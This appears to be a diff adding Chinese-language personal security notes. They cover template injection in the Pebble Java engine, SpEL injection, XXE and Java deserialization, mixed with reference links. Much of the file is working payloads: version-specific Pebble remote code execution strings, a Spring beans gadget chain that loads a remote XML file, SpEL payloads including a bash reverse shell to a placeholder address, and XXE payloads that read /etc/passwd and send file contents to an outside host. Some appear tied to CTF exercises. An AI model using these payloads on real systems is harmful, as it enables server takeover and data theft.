@@ -1,0 +1,505 @@
+Pebble是一个Java模板引擎，灵感来自Twig，类似于Python Jinja模板引擎语法。它具有
+模板继承和易于阅读的语法，附带内置的自动转义以实现安全性，并包括对国际化的集成
+支持。
+官方地址： https://pebbletemplates.io/ 
+
+github wiki: https://github.com/PebbleTemplates/pebble/wiki
+
+语法: Pebble templates 是 Django-like 模板引擎. 类似的引擎还有: Jinja2(Python), Twig(PHP), jtwig(Java)
+
+学习成本: 花上一天学习就能应付日常开发, 官方文档也不长, 学习起来非常快.
+
+目前稳定版: 3.0.5, 而且官方提供了 SpringBoot2 Starter 包.
+
+主页: https://pebbletemplates.io/
+
+github wiki: https://github.com/PebbleTemplates/pebble/wiki
+
+https://github.com/PebbleTemplates/pebble/wiki/basic-usage
+
+https://github.com/PebbleTemplates/pebble/wiki/installation
+
+pebble-spring-boot-2-starter, 会读取一些配置属性, 完整的属性清单见 
+https://github.com/PebbleTemplates/pebble-spring-boot-starter
+
+
+
+
+Pebble版本
+
+利用方式
+
+POC/EXP
+
+<2.5.0
+
+getClass
+
+variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la')
+
+https://github.com/PebbleTemplates/pebble/pull/329
+https://github.com/PebbleTemplates/pebble/issues/234
+
+<3.0.9
+
+利用大小写绕过
+
+variable.getCLASS().forName('java.lang.Runtime').getRuntime().exec('ls -al')
+
+Security issue - allowGetClass(false) can be bypassed using incorrect casing #435
+https://github.com/PebbleTemplates/pebble/issues/435
+issue #435 make allowGetClass check case insensitive #436
+来自 <https://github.com/PebbleTemplates/pebble/pull/436> 
+
+<3.1.1
+
+利用内置方法可以访问java.lang.Class。
+
+Java 中的几个包装类（例如 java.lang.Integer）中有名为 TYPE 的字段，其Type为 java.lang.Class 自身；
+
+(1).TYPE.forName('java.lang.Runtime').getRuntime().exec('ls -al')
+
+(1).TYPE的效果等同于getClass
+https://github.com/PebbleTemplates/pebble/issues/454
+
+获取命令执行结果（Java 9+）
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE
+.forName('java.lang.Runtime')
+.methods[6]
+.invoke(null,null)
+.exec(cmd)
+.inputStream
+.readAllBytes() %}
+{{ (1).TYPE
+.forName('java.lang.String')
+.constructors[0]
+.newInstance(([bytes]).toArray()) }}
+
+<3.1.4
+
+
+
+The following code will throw a security exception after the fix in 454:
+{{(1).TYPE.getClass()}}
+However you can still access getClass via the public static java.lang.Class java.lang.Class.forName(java.lang.Module,java.lang.String) signature:
+{%set daInt = (1).TYPE.protectiondomain().getPermissions.elementsAsStream.findFirst().get.hashCode.TYPE.getModule %}
+{{(1).TYPE.protectiondomain().getPermissions.elementsAsStream.findFirst().get.hashCode.TYPE.forName(daInt,'java.lang.Runtime') }}
+Result:
+class java.lang.Runtime
+
+Unsafe Methods Bypass #493
+https://github.com/PebbleTemplates/pebble/issues/493
+Checking access to all methods of unsafe classes #494
+https://github.com/PebbleTemplates/pebble/pull/494
+
+
+
+
+
+
+
+
+
+
+
+
+模板文件构造
+{% set y= beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory").resourceLoader.classLoader.loadClass("java.beans.Beans") %}
+{% set yy =  beans.get("jacksonObjectMapper").readValue("{}", y) %}
+{% set yyy = yy.instantiate(null,"org.springframework.context.support.ClassPathXmlApplicationContext") %}
+{{ yyy.setConfigLocation("http://xxxx/1.xml") }}
+{{ yyy.refresh() }}
+
+1.xml文件的内容
+<?xml version="1.0" encoding="UTF-8" ?>
+    <beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="
+     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+            <constructor-arg >
+            <list>
+                <value>open</value>
+                <value>-a</value>
+                <value>calculator</value>
+            </list>
+            </constructor-arg>
+        </bean>
+    </beans>
+本地弹出了计算器，那么现在则可以开始着手解题了，
+构造命令./getflag > /tmp/flag
+
+
+
+
+
+
+在用internalCachingMetadataReaderFactory加载类后，使用了jacksonObjectMapper调用受限制的无参构造器。
+Y4tacker师傅随后用Beans绕过了jackson的黑名单，实例化了ClassPathXmlApplicationContext
+但其实既然可以实例化无参构造器，这里野路子还是很多的。
+在SilentE大爹的帮助下，我找到了另一个类
+org.springframework.expression.spel.standard.SpelExpressionParser
+这个类满足上述条件，且不受jackson限制，也不用出网，而且是SpringBoot自带的。
+原理如下
+String cmdStr = "new java.lang.ProcessBuilder(new String[]{\"calc\"}).start()";
+SpelExpressionParser parser = new SpelExpressionParser();
+parser.parseExpression(cmdStr).getValue();
+payload#
+{% set clazz=beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory").getResourceLoader().getClassLoader().loadClass("org.springframework.expression.spel.standard.SpelExpressionParser") %}
+{% set instance =  beans.get("jacksonObjectMapper").readValue("{}", clazz) %}
+{{instance.parseExpression("new java.lang.ProcessBuilder(\"calc\").start()").getValue()}}
+
+
+
+【翻译】从Pebble看服务端模板注入漏洞
+
+来自 <https://gingsguard.github.io/server-side-template-injection-on-the-example-of-pebble/> 
+
+
+
+
+
+Pebble最新模板注入 新gadgets
+https://www.cnblogs.com/kingbridge/articles/16592408.html
+
+Y4tacker师傅在这篇文章中给出了Pebble最新模板注入的exp
+2022UIUCTF-Spoink(Pebble最新模板注入)
+2022UIUCTF-Spoink(Pebble最新模板注入)
+https://tttang.com/archive/1692/#toc_
+
+
+https://www.kumamon.fun/server-side-template-injection-on-the-example-of-pebble/
+https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/
+
+
+SpringBoot系列: Pebble模板引擎
+
+来自 <https://blog.51cto.com/u_15585381/5277417> 
+
+JavaScript引擎基础知识
+https://www.cnblogs.com/cczlovexw/p/13569792.html
+
+2. 奇淫技巧之突破Runtime.exec限制获取shell 命令执行环境
+https://www.anquanke.com/post/id/159554
+
+
+Java Runtime.getRuntime().exec由表及里
+
+来自 <https://www.buaq.net/go-19610.html> 
+
+
+	2. curl
+软件包：https://curl.se/windows/
+使用方法：https://www.ruanyifeng.com/blog/2019/09/curl-reference.html
+
+2. wget
+使用方法：
+https://www.jianshu.com/p/5ddada47bc8d
+https://www.cnblogs.com/zhaojiedi1992/p/zhaojiedi_linux_004.html
+
+	3. netcat
+使用场景：接受反弹shell。
+使用方法：https://www.fujieace.com/linux/nc-2.html
+Windows软件包：https://eternallybored.org/misc/netcat/
+
+https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz
+
+
+
+
+		8. 其它语言反弹shell
+https://xz.aliyun.com/t/9488
+		9. 使用OpenSSL反弹加密shell
+https://xz.aliyun.com/t/9488
+ 
+	7. 绕过方式
+http://ultramangaia.github.io/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+
+
+反弹Shell，看这一篇就够了
+https://xz.aliyun.com/t/9488
+Web安全学习笔记
+https://websec.readthedocs.io/zh/latest/vuln/cmdinjection.html
+命令注入&XXE漏洞利用Get Flag
+http://ultramangaia.github.io/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html（重点）
+
+
+、FEL是什么？
+是谷歌开发的，轻量级表达式计算引擎
+ 
+参考： 
+http://code.google.com/p/fast-el/wiki/Performance
+ 
+https://github.com/dbcxy/fast-el
+ 
+
+
+
+java规则引擎_Java规则引擎Easy Rules的使用介绍
+
+来自 <https://blog.csdn.net/weixin_39527879/article/details/114033439> 
+
+
+Java规则引擎easy
+
+来自 <https://www.apispace.com/news/post/31002.html> 
+
+
+Java规则引擎easy-rules详细介绍
+
+来自 <http://www.45fan.com/article.php?aid=1CO6PUUeGb5KCEVo> 
+
+来自 <https://www.apispace.com/news/post/31002.html> 
+
+java规则引擎easy-rules使用指南 1 - 基本用法
+https://blog.csdn.net/bailiyi/article/details/123811651
+ 
+【规则引擎】之easy-rules入门
+https://blog.csdn.net/justry_deng/article/details/118096941
+
+
+Spel的研究总结
+
+来自 <https://xz.aliyun.com/t/11478> 
+
+API
+
+https://docs.spring.io/spring-framework/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html
+2 StandardEvaluationContext支持的范围广，可能会引入命令注入。
+
+SPEL poc
+
+T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(
+T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})
+
+
+
+T(String).getClass().forName("java.lang.Runtime").getMethod("exec",T(String[])).invoke(T(String).getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(T(String).getClass().forName("java.lang.Runtime")), "calc.exe")
+
+
+
+#{T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"cmd\",\"/C\",\"calc\"})}\n
+
+来自 <https://www.cnblogs.com/SecIN/p/16981773.html> 
+
+
+
+#{T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"/bin/bash","-c","bash -i>&/dev/tcp/xxx.xxx.xxx.xxx/4000 0>&1"})}
+
+来自 <https://www.cnblogs.com/SecIN/p/16981773.html> 
+
+在TemplateParserContext中，自定义了expressionPrefix的值—#{,所以本题才需要用#{}
+
+来自 <https://www.cnblogs.com/SecIN/p/16981773.html> 
+
+
+
+Spring Core-RCE深入分析及步步调试出payload
+
+来自 <https://mp.weixin.qq.com/s/kgw-O4Hsd9r2vfme3Y2Ynw?from=singlemessage&isappinstalled=0&scene=1&clicktime=1649207169&enterid=1649207169> 
+
+
+https://mp.weixin.qq.com/s/kgw-O4Hsd9r2vfme3Y2Ynw?from=singlemessage&isappinstalled=0&scene=1&clicktime=1649207169&enterid=1649207169
+
+
+Spring Cloud Function SPEL表达式注入
+https://mp.weixin.qq.com/s/T4_ZXVez_KZKVTvqEuOmkw
+
+
+Spring常见漏洞和简要利用条件
+
+来自 <https://www.hm-zy.cn/?p=98> 
+
+
+
+SpringBoot SpEL表达式注入漏洞-分析与复现 
+
+来自 <https://www.cnblogs.com/litlife/p/10183137.html> 
+
+spring中@Value注解原理解析——SpEL表达式
+https://www.itlifee.cn/archives/java/spring/spring-value-spel-parser.html
+
+
+【**】Spel-research
+
+https://github.com/Kyo-w/Spel-research
+
+【漏洞通告】Spring Cloud Function SPEL表达式注入漏洞
+
+来自 <https://mp.weixin.qq.com/s/T4_ZXVez_KZKVTvqEuOmkw> 
+
+
+聊聊 QLExpress 源码 (一)
+
+来自 <https://www.icode9.com/content-1-816582.html> 
+
+
+qlexpress是啥？
+这个是阿里内部的一个开源的java规则引擎。开源的链接地址如下：
+http://code.taobao.org/p/QLExpress/wiki/index/
+ExpressClassLoader
+Runner：
+	• ExpressRemoteCacheRunner
+	• LocalExpressCacheRunner
+	• ExpressRunner
+	• InstructionSetRunner
+
+RunEnvironment--是否可RCE？
+
+
+MVEL
+来自 <http://t.zoukankan.com/firstdream-p-6651078.html> 
+
+JEXL
+来自 <https://ridikuius.github.io/Apache-Commons-JEXL3-%E8%AF%AD%E6%B3%95/> 
+
+
+探究Groovy组件的利用方式
+
+来自 <https://www.freebuf.com/vuls/343311.html> 
+
+
+6. 浅谈一种特殊格式的xxe 
+
+https://xz.aliyun.com/t/11203
+
+文中提到了一种在Word文档中嵌入和链接OLE对象实现XXE攻击，对于有使用libreoffice插件进行word转pdf的业务，有参考意义。
+
+是否有回显与XML解析器，开发写的代码(是否返回数据)有关。
+https://www.cnblogs.com/nice0e3/p/13746076.html
+
+
+详细XML文档结构和外部引用可支持的协议说明
+https://www.cnblogs.com/zhaijiahui/p/9147595.html#autoid-2-1-0
+
+
+参考：https://www.cnblogs.com/zhaijiahui/p/9147595.html#autoid-2-1-0
+第一步检测XML是否会被成功解析：
+<?xml version="1.0" encoding="UTF-8"?> 
+<!DOCTYPE ANY [ 
+<!ENTITY name "my name is nMask">]>
+<root>&name;</root>
+如果页面输出了my name is nMask，说明xml文件可以被解析。
+ 
+第二步检测服务器是否支持DTD引用外部实体：
+<?xml version=”1.0” encoding=”UTF-8”?> 
+<!DOCTYPE ANY [ 
+<!ENTITY % name SYSTEM "http://ip:port/index.html"> 
+%name; 
+]>
+可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求index.html的请求。
+	5. 是否回显
+https://www.cnblogs.com/nice0e3/p/13746076.html
+https://www.cnblogs.com/zhaijiahui/p/9147595.html#autoid-2-1-0
+
+		1. 有回显
+Linux
+<?xml version= "1.0" encoding= "UTF-8"?>
+<!DOCTYPE ANY [ 
+<!ENTITY content SYSTEM "file:///etc/passwd"> ]> 
+<name>&content;</name>
+Windows：
+<?xml version= "1.0" encoding= "UTF-8"?>
+<!DOCTYPE ANY [ 
+<!ENTITY content SYSTEM "file:///c:/windows/win.ini"> ]> 
+<name>&content;</name>
+<?xml version= "1.0" encoding= "UTF-8"?>
+<!DOCTYPE ANY [ 
+<!ENTITY content SYSTEM "file://localhost/c:/windows/win.ini"> ]> 
+<name>&content;</name>
+ 
+		2. 无回显
+		<?xml version= "1.0" encoding= "UTF-8"?>
+		<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://10.45.47.49:7777/xxe.dtd">
+		%remote;
+		]>
+本地web服务目录的xxe.dtd文件内容：
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://10.45.47.49:7777/%file;'>">
+%all;
+%send;
+ 
+总结一下：
+1.先通过%remote参数实体请求攻击者服务器上的xxe.dtd。
+2.再调用xxe.dtd中的%file参数实体通过file协议读取本地服务器上指定的文件。
+3.然后把文件内容通过%all参数实体把%file的结果填入到%send。
+4.最后调用%send把读取到的数据通过http协议发送到攻击者服务器上。
+
+
+
+digester
+ 
+
+来自 <https://baike.baidu.com/item/digester/1613861?fr=aladdin> 
+
+
+
+XSSFWorkbook----XMLParser
+JPEGImageEncoder----XMLParser
+
+CVE-2022-35741 XXE
+Apache CloudStack XXE漏洞
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35741
+
+CVE-2022-35741 Apache CloudStack SAML XXE注入
+https://xz.aliyun.com/t/11600
+
+6. 浅谈一种特殊格式的xxe 
+
+https://xz.aliyun.com/t/11203
+
+文中提到了一种在Word文档中嵌入和链接OLE对象实现XXE攻击，对于有使用libreoffice插件进行word转pdf的业务，有参考意义。
+
+
+用PyYAML加载自定义对象
+https://www.cnpython.com/qa/909593
+
+Java反序列化集成工具
+
+来自 <https://www.freebuf.com/sectool/92011.html> 
+
+本工具暂时支持的功能：
+1、本地命令执行并回显，无须加载外部jar包，支持纯内网环境检测。
+2、支持JBoss、WebSphere和Weblogic的反序列化漏洞检测。
+3、支持https数据传输。
+4、支持文件目录列表。
+
+JAVA反序列化exp及使用方法
+https://blog.csdn.net/cd_xuyue/article/details/50243689?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-6&spm=1001.2101.3001.4242
+
+
+https://www.jackson-t.ca/runtime-exec-payloads.html
+
+玩转Ysoserial-CommonsCollection的七种利用方式分析 
+来自 <https://www.freebuf.com/articles/web/214096.html> 
+
+ysoserial-CommonsCollections系列总结篇
+
+来自 <https://www.cnblogs.com/tr1ple/p/12564669.html> 
+
+
+https://www.cnblogs.com/tr1ple/p/12564669.html
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
